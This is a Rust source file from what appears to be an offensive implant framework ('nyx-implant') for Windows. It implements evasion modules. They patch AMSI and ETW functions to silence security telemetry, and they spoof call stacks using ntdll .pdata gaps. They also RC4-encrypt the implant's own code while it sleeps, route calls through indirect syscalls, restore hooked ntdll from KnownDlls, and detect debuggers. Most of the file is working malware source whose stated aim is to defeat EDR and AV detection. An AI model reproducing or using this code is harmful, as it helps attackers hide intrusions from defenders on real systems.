//! Live userland-evasion glue: real impls of `nyx-implant-evasionsdk` traits
//! over the live Windows process. P2.1a-i (`PdataGapScanner`) lives here; the
//! later steps added `StackSpoofKit` / `BlindKit` / `MemoryMaskKit`, and the
//! 2026-08 wave added the remaining foundation/self-defense/sleep seams:
//! `SyscallProvider` ([`LiveSyscalls`]), `UnhookKit` ([`LiveUnhook`]),
//! `AntiDebugKit` ([`LiveAntiDebug`]) and `SleepmaskKit` ([`LiveSleepmask`]).
//!
//! ## Single-source-of-truth rule
//! The algorithmic cores (gap enumeration, frame-chain synthesis, RC4) live
//! ONLY in `nyx-implant-evasionsdk::{gap,frame,rc4}`. This module's job is to
//! feed them *live bytes* read from the process via the PEB walk in
//! [`nyx_implant_core::resolve`], and to turn their RVA outputs into absolute addresses.
//! We never re-parse `RUNTIME_FUNCTION_ENTRY` or recompute gaps here — that
//! would fork the math and silently desync from the unit-tested core.
//! See `docs/WINDOWS_DEV.md §4` (P2.1a-i).

#![cfg(target_os = "windows")]

use nyx_implant_core::resolve;
use nyx_implant_evasionsdk::gap;
use nyx_implant_evasionsdk::{
    AntiDebugKit, BlindKit, BlindTarget, EvasionError, GapPool, MaskToken, MemoryMaskKit,
    PdataGapScanner, SleepmaskKit, SpoofGuard, StackSpoofKit, SyscallProvider, UnhookKit,
};

/// Cap on how many 8-byte-aligned gap anchors we sample per inter-function /
/// tail range. Keeps the `GapPool` bounded (a raw ntdll has ~3900 RUNTIME_
/// FUNCTION entries → without a cap the pool could reach tens of thousands).
/// 8 per range is plenty for BYOUD-Gap leaf-bridge chains (depth typically 8).
const MAX_PER_GAP: usize = 8;

/// The four whitelisted DLLs whose `.pdata` gaps are safe leaf-bridge anchors
/// (all are always-present, signed, system modules — EDRs trust frames whose
/// return addresses land in their export ranges). `win32u.dll`/`wow64.dll` are
/// absent on some builds; a missing module is skipped, not fatal.
const WHITELIST: &[&[u8]] = &[b"ntdll.dll", b"kernelbase.dll", b"win32u.dll", b"wow64.dll"];

/// Real `.pdata` gap scanner: PEB-walk each whitelisted DLL, read its
/// exception directory via [`resolve::pdata_view`], run the pure gap core
/// (`parse_table` → `enumerate_gaps` → `classify_into_pool`), and merge the
/// results into one `GapPool` of **absolute** addresses (`base + rva`).
///
/// Produces the shared `GapPool` that `StackSpoofKit::ByoudGap` (P2.1a-ii)
/// borrows; future `SleepmaskKit` impls may borrow it too.
pub struct LivePdataScanner;

impl PdataGapScanner for LivePdataScanner {
    fn scan(&self) -> Result<GapPool, EvasionError> {
        let mut pool = GapPool::default();
        for &name in WHITELIST {
            scan_module(name, &mut pool);
        }
        if !pool.is_usable() {
            // No gaps anywhere = something is badly wrong (every Win10/11/Server
            // ntdll has thousands). Surface it rather than silently degrade.
            return Err(EvasionError::Unresolved(
                "no .pdata gaps on any whitelisted DLL",
            ));
        }
        // LACUNA layer 5: populate the `backed` pool with real `.pdata`-covered
        // ntdll/kernelbase function addresses to use as chain terminators. These
        // defeat return-address-in-module validation (the unwinder's final frame
        // resolves to a legit signed module). We pick a few well-known leaf-like
        // exports whose addresses are stable and non-sensitive.
        populate_backed_targets(&mut pool);
        Ok(pool)
    }
}

/// Scan one whitelisted DLL: resolve its base, read its `.pdata` exception
/// directory, run the pure gap core and merge the results into `pool`.
fn scan_module(name: &[u8], pool: &mut GapPool) {
    // SAFETY: PEB walk reads loader state stable post-load; pdata_view
    // reads a loader-owned, committed section. A module not in the
    // loader list simply yields None and is skipped.
    let base = unsafe { resolve::module_base_by_name(name) };
    let base = match base {
        Some(b) => b,
        None => return, // win32u/wow64 may be absent — skip, not fatal
    };
    let view = match unsafe { resolve::pdata_view(base) } {
        Some(v) => v,
        None => return, // module mapped but no .pdata — skip
    };
    // Pure core: bytes → sorted RUNTIME_FUNCTION_ENTRY list.
    let entries = gap::RuntimeFunctionEntry::parse_table(view.bytes);
    // Pure core: entries → gap RVAs (inter-function + tail), sampled
    // every 8 bytes, capped at MAX_PER_GAP per range.
    let gaps = gap::enumerate_gaps(&entries, view.image_size, MAX_PER_GAP);
    if gaps.is_empty() {
        return;
    }
    classify_module(base, &gaps, view.image_size, pool);
}

/// Classify each gap RVA into gaps/ghosts/nops via byte-pattern predicates
/// read from the live image, promote RVAs to absolute addresses and merge
/// the result into `pool`. `image` is the raw bytes from `[base,
/// base+image_size)` so the predicates can inspect the byte at each gap RVA.
fn classify_module(base: *mut u8, gaps: &[gap::Gap], image_size: u32, pool: &mut GapPool) {
    // SAFETY: the whole module image is mapped readable; reading one
    // byte at an in-range RVA is sound.
    let image_bytes = unsafe { core::slice::from_raw_parts(base, image_size as usize) };
    let mut per_module = gap::classify_into_pool(
        gaps,
        Some(image_bytes),
        // ghost_pred: a real executable byte at the gap → a "ghost"
        // function (code with no .pdata entry). `C3` (ret) at a gap
        // strongly implies a tiny leaf/thunk lives there. Treat any
        // non-zero, non-padding byte as a ghost candidate.
        ghost_pred,
        // nop_pred: alignment / padding fills (`90` nop, `CC` int3, or
        // a run of zero bytes) between functions, plus multi-byte NOPs.
        nop_pred,
    );
    // Promote RVAs to absolute addresses so downstream kits (frame
    // chains, leaf-bridge synthesis) get directly-usable pointers.
    let base_usize = base as usize;
    for a in per_module.gaps.iter_mut() {
        *a += base_usize;
    }
    for a in per_module.ghosts.iter_mut() {
        *a += base_usize;
    }
    for a in per_module.nops.iter_mut() {
        *a += base_usize;
    }
    for a in per_module.tails.iter_mut() {
        *a += base_usize;
    }
    pool.gaps.extend_from_slice(&per_module.gaps);
    pool.ghosts.extend_from_slice(&per_module.ghosts);
    pool.nops.extend_from_slice(&per_module.nops);
    pool.tails.extend_from_slice(&per_module.tails);
}

/// ghost_pred: a real executable byte at the gap → a "ghost" function (code
/// with no .pdata entry). `C3` (ret) at a gap strongly implies a tiny
/// leaf/thunk lives there. Treat any non-zero, non-padding byte as a ghost
/// candidate. Strongest signal: a leaf return (C3 ret / C2 imm16 ret / E8
/// rel32 call thunk). Treat C3/C2/E8 as ghost candidates.
fn ghost_pred(_rva: u32, image: Option<&[u8]>) -> bool {
    let img = match image {
        Some(b) => b,
        None => return false,
    };
    let off = _rva as usize;
    if off >= img.len() {
        return false;
    }
    matches!(img[off], 0xC3 | 0xC2 | 0xE8)
}

/// nop_pred: alignment / padding fills (`90` nop, `CC` int3, or a run of zero
/// bytes) between functions, plus multi-byte NOPs.
fn nop_pred(_rva: u32, image: Option<&[u8]>) -> bool {
    let img = match image {
        Some(b) => b,
        None => return false,
    };
    let off = _rva as usize;
    if off >= img.len() {
        return false;
    }
    let b = img[off];
    b == 0x90
        || b == 0xCC
        || b == 0x00
        || (b == 0x66 && off + 1 < img.len() && img[off + 1] == 0x90)
}

/// LACUNA layer 5: populate the `backed` pool with real `.pdata`-covered
/// ntdll/kernelbase function addresses to use as chain terminators. These
/// defeat return-address-in-module validation (the unwinder's final frame
/// resolves to a legit signed module). We pick a few well-known leaf-like
/// exports whose addresses are stable and non-sensitive.
fn populate_backed_targets(pool: &mut GapPool) {
    let backed_targets: &[(&[u8], &[u8])] = &[
        (b"ntdll.dll", b"NtDelayExecution"),
        (b"ntdll.dll", b"NtClose"),
        (b"kernelbase.dll", b"Sleep"),
    ];
    for &(module, func) in backed_targets {
        if let Some(addr) = unsafe { resolve::export_addr(module, func) } {
            pool.backed.push(addr);
        }
    }
}

// ---- StackSpoofKit (P2.1a-ii) ----------------------------------------------
//
// Live BYOUD-Gap leaf-bridge chain staging + verification. The data path
// (chain synthesis via `frame::build_leaf_bridge`) always runs so the chain
// is verifiable via selftest. The actual RSP swap is gated behind
// `stack::swap_enabled()` (default OFF) — see the module-level CET two-layer
// note in stack.rs.

/// Live call-stack spoof: stages BYOUD-Gap leaf-bridge chains and (when the
/// CET-safe RSP swap is enabled) wraps sensitive calls in the spoofed scope.
pub struct LiveStackSpoof;

impl StackSpoofKit for LiveStackSpoof {
    fn enter(&self, _gaps: &GapPool) -> Result<SpoofGuard, EvasionError> {
        // Stage the chain (data path always runs for verification).
        // spoof_wrap runs the staging even when the RSP swap is gated OFF.
        // We call it with a no-op closure so the chain is staged into the
        // global pool and verified (depth > 0, all slots non-zero) without
        // actually wrapping any real syscall here.
        unsafe {
            nyx_implant_core::stack::spoof_wrap(|| {});
        }
        // Verify that a chain was actually staged (depth > 0).
        let depth = nyx_implant_core::stack::last_staged_depth();
        if depth == 0 {
            // No gaps available → spoof unavailable → degrade.
            return Ok(SpoofGuard::noop());
        }
        Ok(SpoofGuard::new(|| {
            // Restore closure: currently a no-op because the RSP swap is gated.
            // When the swap goes live, this will restore the original RSP.
        }))
    }
}

// ---- BlindKit (P2.1b) -----------------------------------------------------
//
// Routes the SDK `BlindTarget` enum to the live byte-patch primitives in
// `crate::blind`. Each variant maps to one of the verified x64 patch sequences;
// `blind()` is idempotent (blind.rs short-circuits on `already_patched`), so a
// per-cycle retry from the beacon loop is cheap once the patch has landed.

/// Live userland AMSI/ETW blind: routes [`BlindTarget`] to the byte-patch
/// primitives in [`crate::blind`]. P2.1b adds `NtTraceEvent` (one patch covers
/// the whole `EtwEventWrite*` family); `EtwEventWrite` is kept as the narrower
/// P0 surface, `Amsi`/`Clr` hit the content-scan surfaces.
pub struct LiveBlind;

impl BlindKit for LiveBlind {
    fn blind(&self, target: BlindTarget) -> Result<(), EvasionError> {
        // SAFETY: blind() runs in the single-threaded beacon context after the
        // PEB-walk resolver is up. Each patch is idempotent + restores the
        // original page protection after the write window.
        let r = unsafe {
            match target {
                BlindTarget::NtTraceEvent => {
                    // The NtTraceEvent byte-patch (xor eax,eax; ret) covers
                    // the entire EtwEventWrite* family — one patch, all
                    // providers silenced. We do NOT also call
                    // disable_etw_provider() here: for kernel providers like
                    // ETW-TI it always fails (STATUS_ACCESS_DENIED — the kernel
                    // owns the provider's IsEnabled), and the failed syscall
                    // generates unnecessary telemetry. The byte-patch alone is
                    // sufficient and has less blast radius.
                    crate::blind::patch_nt_trace_event()
                }
                BlindTarget::EtwEventWrite => crate::blind::patch_etw(),
                BlindTarget::Amsi => crate::blind::patch_amsi(),
                BlindTarget::Clr => {
                    // clr.dll!AmsiScanBuffer mirrors amsi.dll's but is less
                    // watched. Resolve + patch it the same way; if the CLR isn't
                    // loaded (common at cold start), surface as Unresolved so the
                    // caller (beacon loop's per-cycle retry) can try again later.
                    match nyx_implant_core::resolve::export_addr(b"clr.dll", b"AmsiScanBuffer") {
                        Some(addr) => crate::blind::patch_clr(addr),
                        None => return Err(EvasionError::Unresolved("clr.dll!AmsiScanBuffer")),
                    }
                }
            }
        };
        r.map_err(|msg| EvasionError::Other(heap_str(msg)))
    }
}

/// Copy a `&str` error from blind.rs into an owned `String` for
/// `EvasionError::Other`. blind.rs returns `&str` literals; we lift
/// them into the SDK's owned-string error variant.
fn heap_str(s: &str) -> alloc::string::String {
    let mut out = alloc::string::String::new();
    out.push_str(s);
    out
}

// ---- MemoryMaskKit (P2.1d) ------------------------------------------------
//
// The content-encryption half of sleep obfuscation. Encrypts the implant
// `.text` region (RC4 via the pure core) and flips RX→RW before sleep,
// decrypts + flips back after sleep. Beats `EtwTI-FluctuationMonitor`
// (content encryption) and Fluctuation (page-protection flip).
//
// ## Usage contract
// `mask()` must be called while the thread is NOT executing from `.text` —
// i.e. inside a sleep-mask chain where a helper thread runs the encrypt
// while the beacon thread is parked (originally the Foliage APC chain,
// removed in commit 841ffc5). The beacon loop calls `mask()`/
// `unmask()` only through the `SleepmaskKit` seam, never synchronously.

/// Live memory-content mask: encrypt the implant `.text` via RC4 and
/// flip RX→RW, restoring on `unmask`. Delegates to `crate::mem::{mask_text,
/// unmask_text}` for the actual VirtualProtect + RC4 operations, and to
/// `crate::sleep::own_text_region()` for the PE-resolved `.text` base+len.
pub struct LiveMemoryMask;

impl MemoryMaskKit for LiveMemoryMask {
    fn mask(&self) -> Result<MaskToken, EvasionError> {
        let region = unsafe { crate::sleep::own_text_region() }
            .ok_or(EvasionError::Unresolved(".text region"))?;
        let key = crate::mem::mask_key();
        // Flip RX→RW then RC4-encrypt. SAFETY: caller guarantees we're in a
        // helper-thread mask context — the beacon thread is parked in
        // alertable sleep, NOT executing .text.
        unsafe {
            crate::mem::mask_text(region.base, region.len, key);
        }
        Ok(MaskToken::new(region.base, region.len, *key))
    }

    fn unmask(&self, token: MaskToken) -> Result<(), EvasionError> {
        // Decrypt then flip RW→RX. SAFETY: must run before any code in .text
        // executes (the helper thread unmasks before the beacon wakes).
        unsafe {
            crate::mem::unmask_text(token.base, token.len, &token.key);
        }
        Ok(())
    }
}

// ---- SyscallProvider (P2.1e) ----------------------------------------------
//
// The foundation seam every sensitive call routes through: prime the
// process-wide indirect-syscall runtime in `nyx_implant_core::syscalls`
// (SSN table resolved from the PRISTINE ntdll — KnownDlls fresh map → disk →
// hooked fallback — plus the RX trampoline of per-SSN stubs that jump to an
// in-ntdll `syscall; ret` gadget).

/// Live syscall source: primes [`nyx_implant_core::syscalls`] once
/// (idempotently) and then verifies the runtime is actually usable — not just
/// "init returned", but the canonical first syscall's SSN resolved.
///
/// **Honest degrade semantics (x64-on-ARM64 "Prism" emulation):** indirect
/// syscalls are FATAL under the emulator (0xC000026F at the shared gadget —
/// see `syscalls::Runtime::direct`), so the runtime comes up in *direct* mode
/// there: the SSN table is still resolved but `syscall4/5/6/11` call the ntdll
/// exports directly (function over stealth — the crate-wide noevasion-degrade
/// convention). `prime()` returns `Ok` in both modes because the capability
/// this seam contracts — "a resolved syscall runtime backs sensitive calls" —
/// is present either way; callers that care about the stealth level can query
/// `syscalls::global().map(|rt| rt.is_direct_mode())`.
pub struct LiveSyscalls;

impl SyscallProvider for LiveSyscalls {
    fn prime(&self) -> Result<(), EvasionError> {
        // Idempotent: only the first call builds the runtime; later calls are
        // no-ops (the trait's "resolve (or confirm)" contract).
        unsafe { nyx_implant_core::syscalls::init_global() };
        let rt = nyx_implant_core::syscalls::global().ok_or(EvasionError::Unresolved(
            "indirect-syscall runtime init (ntdll locate / SSN table / trampoline)",
        ))?;
        // Liveness proof, not just presence: the canonical first syscall an
        // implant makes must have a resolved SSN. (The table is built in
        // direct/emulated mode too — SSNs are simply unused for dispatch.)
        if nyx_implant_core::syscalls::ssn_nt_allocate_virtual_memory(rt).is_none() {
            return Err(EvasionError::Unresolved("NtAllocateVirtualMemory SSN"));
        }
        Ok(())
    }
}

// ---- UnhookKit (P2.1f) -----------------------------------------------------

/// Live unhook: restore the in-process ntdll `.text` from the pristine
/// `\KnownDlls\ntdll` SEC_IMAGE map (disk fallback) — the write-back half of
/// `nyx_implant_core::unhook`, which previously only *read* the fresh map as
/// an SSN-resolution source. See [`nyx_implant_core::unhook::restore_ntdll_text`]
/// for the source chain and the hard ordering constraint: MUST run before
/// `BlindKit` — the restore overwrites our own ntdll byte-patches too.
/// Idempotent: an already-pristine ntdll costs one fresh map + diff, no write.
///
/// **Decision: opt-in only, never in the default bootstrap.** External
/// evidence (AutoBypass, arXiv 2608.01639, Table 11 — aggregated across 5
/// real AV/EDR): `unhook_ntdll` succeeds 51.4% of the time but generates 139
/// alerts, the second-highest alert volume of all techniques measured — EDR
/// self-integrity checks watch `.text` restoration closely. That alert
/// profile contradicts Nyx's default HWBP patchless-blind route, so this kit
/// stays an operator-selected option alongside the other non-default impls.
pub struct LiveUnhook;

impl UnhookKit for LiveUnhook {
    fn unhook(&self) -> Result<(), EvasionError> {
        // The returned diff count (bytes restored) is diagnostic only; the
        // seam's success contract is "ntdll .text is pristine on return".
        unsafe { nyx_implant_core::unhook::restore_ntdll_text() }
            .map(|_diffs| ())
            .map_err(|msg| EvasionError::Other(heap_str(msg)))
    }
}

// ---- AntiDebugKit (P2.1g) --------------------------------------------------

/// Live anti-debug: `PEB->BeingDebugged` (raw `gs:[0x60]` read — no API, no
/// ETW) OR `NtQueryInformationProcess(ProcessDebugPort)` routed through the
/// indirect-syscall runtime when primed (export-resolution fallback
/// otherwise). This is the `PebDebugPort` impl the seam doc lists as shipped;
/// the primitives live in [`crate::antidebug`].
///
/// Deliberately NOT the full sandbox verdict: the uptime heuristic
/// (`antidebug::uptime_secs`) answers "is this a fresh sandbox", not "is a
/// debugger attached", so it stays out of this seam — the beacon bootstrap
/// gate calls `antidebug::looks_sandboxed` directly for the combined check.
pub struct LiveAntiDebug;

impl AntiDebugKit for LiveAntiDebug {
    fn is_being_debugged(&self) -> Result<bool, EvasionError> {
        // Always `Ok`: the PEB byte read cannot fail, and the DebugPort query
        // treats "could not resolve / query failed" as not-debugged (a host
        // where ntdll export resolution fails outright has bigger problems —
        // see antidebug.rs). A real debugger trip surfaces as `Ok(true)`.
        Ok(crate::antidebug::is_debugged() || crate::antidebug::is_remote_debugged())
    }
}

// ---- SleepmaskKit (P2.1a-iii) ---------------------------------------------
//
// The Fluctuation PAGE_NOACCESS `.text` flip during sleep. Independent
// opt-in like LiveUnhook: do NOT assemble this into the default
// `EvasionStack` or `entry.rs` bootstrap. Production sleep routing stays
// in `nyx-implant-tasks::kits` (`Fluctuation` + `evasion_active() &&
// enabled()` gating) — wiring both would double-sleep.

/// Live sleep-mask: delegates to [`crate::fluctuation::sleep`] (the real
/// PAGE_NOACCESS flip). `_gaps` is unused on purpose — this path does not
/// stomp `.pdata` during sleep (InsomniacUnwinding-class impls would).
///
/// **Decision: opt-in only, never in the default bootstrap / `EvasionStack`.**
/// Same rule as [`LiveUnhook`]. `kits.rs` remains the production sleep
/// router so this seam can exist without changing beacon timing.
///
/// Never returns [`EvasionError::NoFloor`]: if fluctuation is disarmed or
/// degrades (Prism, resolve failure), `fluctuation::sleep` already falls
/// through to plain sleep, and this seam still reports `Ok(())` — masked
/// or degraded sleep happened.
pub struct LiveSleepmask;

impl SleepmaskKit for LiveSleepmask {
    fn sleep_masked(&self, seconds: u32, _gaps: &GapPool) -> Result<(), EvasionError> {
        crate::fluctuation::sleep(seconds);
        Ok(())
    }
}

// NOTE (WP-C 断环第二刀): the `ProcessInjectKit` glue (`ModuleStomper`) moved
// to the tasks crate's `inject` module (`nyx-implant-tasks`), so this module
// no longer depends on the inject side.

#[cfg(test)]
mod tests {
    use super::*;

    /// ghost_pred: C3 (ret) / C2 (ret imm16) / E8 (call rel32) at the gap are
    /// ghost-function candidates; padding and anything else are not. A missing
    /// image or out-of-range RVA is always false.
    #[test]
    fn ghost_pred_byte_classification() {
        let img = [0xC3u8, 0x90, 0xC2, 0xE8];
        assert!(ghost_pred(0, Some(&img)));
        assert!(!ghost_pred(1, Some(&img)));
        assert!(ghost_pred(2, Some(&img)));
        assert!(ghost_pred(3, Some(&img)));
        assert!(!ghost_pred(4, Some(&img)), "out-of-range RVA");
        assert!(!ghost_pred(0, None), "no image");
    }

    /// nop_pred: 90 / CC / 00 fills and the multi-byte 66 90 NOP count as
    /// alignment padding; a trailing lone 66 and non-padding bytes do not.
    #[test]
    fn nop_pred_byte_classification() {
        let img = [0x90u8, 0xCC, 0x00, 0x66, 0x90, 0x66, 0x91, 0x66];
        assert!(nop_pred(0, Some(&img)));
        assert!(nop_pred(1, Some(&img)));
        assert!(nop_pred(2, Some(&img)));
        assert!(nop_pred(3, Some(&img)), "66 90 two-byte NOP");
        assert!(
            !nop_pred(5, Some(&img)),
            "66 91 (xchg cx,ax) is not a NOP fill"
        );
        assert!(!nop_pred(7, Some(&img)), "lone trailing 66");
        assert!(!nop_pred(8, Some(&img)), "out-of-range RVA");
        assert!(!nop_pred(0, None), "no image");
    }

    /// LiveSyscalls::prime installs the process-wide indirect-syscall runtime
    /// for real (PEB walk → pristine-source SSN table → RX trampoline) and is
    /// idempotent. Direct (x64-on-ARM64 emulated) mode is accepted — the
    /// documented Prism degrade, not a failure. prime() itself enforces the
    /// canonical-SSN liveness check, so an Ok return already proves it; the
    /// assert below documents that contract against the installed runtime.
    #[test]
    fn live_syscalls_prime_installs_runtime() {
        let p = LiveSyscalls;
        p.prime().expect("prime on a live ntdll");
        let rt = nyx_implant_core::syscalls::global().expect("runtime installed");
        assert!(
            rt.is_direct_mode()
                || nyx_implant_core::syscalls::ssn_nt_allocate_virtual_memory(rt).is_some(),
            "native mode resolves the canonical SSN"
        );
        // Idempotent: a second prime confirms rather than rebuilds.
        p.prime().expect("prime is idempotent");
    }

    /// LiveUnhook::unhook leaves the in-process ntdll `.text` pristine. Under
    /// wine (no EDR hooks) the idempotent no-write path is taken; on a hooked
    /// host the write-back runs. Either way the post-condition must hold: a
    /// second restore pass finds ZERO diffs. Source-agnostic — works whether
    /// the pristine copy came from KnownDlls or the disk fallback. The
    /// write-back path itself (simulated hook → byte restored) is covered by
    /// `implant-core::unhook::tests::restore_repairs_simulated_hook`.
    #[test]
    fn live_unhook_leaves_ntdll_pristine() {
        let u = LiveUnhook;
        u.unhook()
            .expect("unhook via KnownDlls or disk pristine source");
        let second =
            unsafe { nyx_implant_core::unhook::restore_ntdll_text() }.expect("second restore pass");
        assert_eq!(second, 0, "post-unhook restore must be a no-op");
    }

    /// LiveAntiDebug through the seam: no debugger is attached to the wine
    /// test harness, so the verdict must be Ok(false) — the PEB byte is clear
    /// and ProcessDebugPort is zero. Proves the seam wiring returns a REAL
    /// verdict instead of the floor's NoFloor error. (The primitives' own
    /// tests live in antidebug.rs.)
    #[test]
    fn live_antidebug_reports_clean_without_debugger() {
        let a = LiveAntiDebug;
        assert!(
            matches!(a.is_being_debugged(), Ok(false)),
            "PEB.BeingDebugged + ProcessDebugPort both clean"
        );
    }

    /// LiveSleepmask exists on the SDK seam (object-safe, constructible) and
    /// Floors stays honest. Invoking `sleep_masked` here would PAGE_NOACCESS
    /// `.text` while sibling tests still execute from it, so the live call is
    /// skipped; the impl is a one-line delegate that always returns `Ok(())`.
    #[test]
    fn live_sleepmask_exists_floors_still_no_floor() {
        let gaps = GapPool::default();
        assert!(
            matches!(
                nyx_implant_evasionsdk::Floors.sleep_masked(0, &gaps),
                Err(EvasionError::NoFloor("SleepmaskKit"))
            ),
            "default floor stays NoFloor"
        );
        fn assert_kit<K: SleepmaskKit + ?Sized>(_: &K) {}
        let kit: &dyn SleepmaskKit = &LiveSleepmask;
        assert_kit(kit);
    }
}
